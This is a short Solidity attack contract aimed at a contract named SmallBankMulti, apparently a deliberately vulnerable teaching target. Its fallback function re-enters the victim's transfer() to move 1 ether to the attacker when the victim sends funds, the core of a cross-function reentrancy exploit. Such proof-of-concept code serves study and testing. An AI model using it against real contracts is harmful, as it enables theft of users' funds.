// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


interface SmallBankMulti {
    function withdraw() external;
    function transfer(address to, uint amount) external;
    function deposit() external payable;
}

contract SmallBankMultiAttack {
    address smallBankMultiAddress;
    address owner;

    constructor(address _smallBankMultiAddress) payable {
        smallBankMultiAddress = _smallBankMultiAddress;
        owner = msg.sender;
    }

    fallback() external payable {
        SmallBankMulti(smallBankMultiAddress).transfer(owner, 1 ether);
    }

}